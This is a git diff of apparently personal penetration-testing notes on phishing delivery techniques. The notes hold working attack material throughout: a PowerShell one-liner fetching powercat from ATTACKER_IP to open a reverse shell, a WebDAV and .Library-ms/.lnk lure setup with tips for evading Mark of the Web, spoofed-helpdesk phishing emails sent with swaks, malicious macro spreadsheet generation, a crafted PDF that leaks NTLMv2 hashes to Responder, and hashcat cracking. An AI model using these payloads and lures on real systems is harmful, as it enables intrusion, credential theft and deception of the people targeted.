+powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://ATTACKER_IP:LOCAL_PORT/powercat.ps1'); powercat -c ATTACKER_IP -p LISTENER_PORT -e powershell"
 ```
 
-4. Copy the `.LNK` and the `.Library-ms` to the WebDAV server:
+3. Setup the WebDAV server on the attack host:
 ```bash
-$ smbclient //LOCAL_HOST/share -c 'put config.Library-ms'
+$ pip3 install wsgidav --break-system-packages
+# or: sudo apt install python3-wsgidav
+
+$ mkdir /home/kali/webdav
+$ cp automatic_configuration.lnk /home/kali/webdav/
+
+$ /home/kali/.local/bin/wsgidav \
+    --host=0.0.0.0 \
+    --port=80 \
+    --auth=anonymous \
+    --root /home/kali/webdav/
+
+# Parameters:
+# --host=0.0.0.0    listen on all interfaces
+# --port=80         port (must match the URL in the Library file)
+# --auth=anonymous  no auth required (victim connects without prompting)
+# --root=<DIR>      directory to serve as the WebDAV share
 ```
-
-> [!Note]
-> This step involves uploading the files to the kali attack machine where the webdav server is going to be hosted. We can use SMB shares better.
-
-5. Start the listeners and http server:
-```bash
-$ python3 -m http.server LOCAL_PORT
-$ nc -nvlp LISTENER_PORT
-```
-
-6. Setup a WebDAV server on our attack host:
 
 > [!Important]
-> Dont setup the server and wait until the `config.Library-ms` and the `.LNK` are in the webdav folder to avoid changing the config metadata.
+> Don't start the WebDAV server until `config.Library-ms` and `automatic_configuration.lnk` are already in the webdav folder. Starting the server before causes metadata timestamp issues.
+
+4. Start listeners:
+```bash
+$ python3 -m http.server LOCAL_PORT   # to serve powercat.ps1
+$ nc -nvlp LISTENER_PORT              # to receive the reverse shell
+```
+
+5. Send the phishing email with the `.Library-ms` file:
+```bash
+$ sudo swaks \
+    -t target@company.com \
+    -t target2@company.com \
+    --from helpdesk@company.com \
+    --attach @config.Library-ms \
+    --server SMTP_SERVER_IP \
+    --body @body.txt \
+    --header "Subject: Urgent: VPN Configuration Update" \
+    --suppress-data -ap
+
+# -ap: prompt for SMTP authentication password
+# --suppress-data: don't echo the email body to stdout
+# @config.Library-ms: @ prefix attaches the file (without @ it sends the string)
+```
+
+> [!Warning] OPSEC
+> - `.Library-ms` files bypass Mark of the Web in many Windows configurations since they reference a WebDAV location rather than downloading a file.
+> - The `.lnk` shortcut is still visible to the user — name it something convincing: `VPN_Setup.lnk`, `IT_Configuration.lnk`.
+> - WebDAV traffic on port 80 blends in with normal HTTP. Port 445 (SMB share) is an alternative but more likely to be blocked at the perimeter.
+
+---
+# ODT/ODS Malicious Payloads (Automated)
+
+Generate malicious OpenDocument spreadsheets/docs (LibreOffice format) with an embedded macro payload using the MMG-LO tool.
 
 ```bash
-$ pip3 install wsgidav # install the webdav server packages
-or
-$ sudo apt install python3-wsgidav
+$ git clone https://github.com/0bfxgh0st/MMG-LO/
+$ cd MMG-LO
 
+# Generate ODS payload (spreadsheet)
+$ python3 mmg-ods.py [windows|linux] ATTACKER_IP LPORT
 
-$ mkdir /home/kali/webdav # create the directory where we are going to host the .lnk to the payload
-
-$ touch /home/kali/webdav/test.txt # create a placeholder
-
-$ /home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/ # initiate the WebDAV server
-
-Parameters:
---host=<IP>: host where we are serving the webdav
---port=<PORT>: port where we are serving the webdav
---auth=<TYPE>: auth type
---root=<DIR>: root dir of the webdav share
+# windows|linux = target OS architecture
 ```
 
-7. Send a phishing email to the target with the `config.Library-ms`:
+Setup listener and send:
 ```bash
-$ sudo swaks [ -t DESTINATION_EMAIL -t DESTINATION_EMAIL ...] --from SOURCE_EMAIL -ap --attach @config.Library-ms --server <victim-ip> --body @body.txt --header "Subject: Urgent Configuration Setup" --suppress-data
+$ nc -nvlp LPORT
 
-Example:
-sudo swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --attach @config.Library-ms --server 192.168.50.242 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap
-
-or
-
-$ sudo swaks -t mailadmin@localhost --from jonas@localhost --attach @file.ods --server 192.168.138.140 --body "Please check this spreadsheet" --header "Subject: Please check this spreadsheet"
+$ sudo swaks -t target@company.com --from sender@company.com \
+    --attach @payload.ods \
+    --server SMTP_SERVER_IP \
+    --body "Please review the attached Q3 spreadsheet." \
+    --header "Subject: Q3 Budget Review"
 ```
 
-> [!Note]
-> Put `@` before the attachments to attach the files. If not, a string will be send.
+---
+# File Upload Phishing (Hash Capture)
 
-# Create ODT/ODS format payloads (automated)
+If a web application has a file upload feature where a user (or admin) will open the uploaded file (e.g., CV upload for a job application, document upload for review), we can upload a specially crafted file that causes the opener's machine to authenticate to our Responder instance — capturing their NTLMv2 hash.
 
-Clone the following repo:
-```bash
-git clone https://github.com/0bfxgh0st/MMG-LO/
+1. Start Responder on your attack machine:
+```sh
+$ sudo responder -I INTERFACE       # e.g., tun0 for VPN
 ```
 
-Usage:
-```bash
-python3 mmg-ods.py [windows|linux] LOCAL_IP LOCAL_PORT
+2. Craft the malicious file. The file contains a reference to a UNC path (`\\ATTACKER_IP\share\`) that Windows automatically tries to authenticate to when the file is opened.
 
-[windows|linux] = target OS
-```
-
-Setup a listener:
-```bash
-nc -nvlp LOCAL_PORT
-```
-
-Send email:
-```bash
-sudo swaks [ -t DESTINATION_EMAIL -t DESTINATION_EMAIL ...] --from SOURCE_EMAIL -ap --attach @config.Library-ms --server <victim-ip> --body @body.txt --header "Subject: Urgent Configuration Setup" --suppress-data
-```
-
-# File Upload Phishing
-
-If we identify in a web server a file upload functionality that we know a user behind will open the uploaded file (for example a CV for a job application), we can setup a responder and upload a file referencing our IP to extract the user hash.
-
-1. Setup responder:
-```
-$ sudo responder -I INTERFACE
-```
-
-2. Craft the malicious phishing payload:
-
-**PDF**
+**PDF payload** (forces UNC auth when rendered):
 ```
 %PDF-1.4
 1 0 obj
@@ -876,7 +435,7 @@ endobj
 /BitsPerComponent 8
 /Filter /DCTDecode
 /Length 0
-/F (\\\\ATTACKER_IP\\share\\test.jpg)
+/F (\\\\ATTACKER_IP\\share\\image.jpg)
 >>
 stream
 endstream
@@ -889,5 +448,24 @@ trailer
 << /Size 6 /Root 1 0 R >>
 startxref
 %%EOF
-
 ```
+
+3. Upload the file via the web application.
+
+4. When the backend user opens the file, their machine automatically attempts NTLM authentication to `\\ATTACKER_IP\share\` — Responder captures the NTLMv2 hash.
+
+5. Crack the hash:
+```bash
+$ hashcat -m 5600 captured_hash.txt /usr/share/wordlists/rockyou.txt
+```
+
+> [!Note]
+> `.docx` files with embedded images referencing UNC paths work on the same principle. Tools like [ntlm_theft](https://github.com/Greenwolf/ntlm_theft) automate generating various file types (`.docx`, `.xlsx`, `.pdf`, `.url`, `.lnk`) that all trigger UNC auth.
+
+---
+# Related Notes
+- [[Phishing with Microsoft Office]] — VBA macros, HTA attacks, shellcode runners, MacroPack
+- [[Phishing with Calendars]] — ICS calendar phishing
+- [[Pretexting]] — social engineering and lure design
+- [[Command and Control (C2-C&C)]] — post-exploitation after getting a shell
+- [[AV Evasion]] — payload obfuscation to bypass AV on delivery
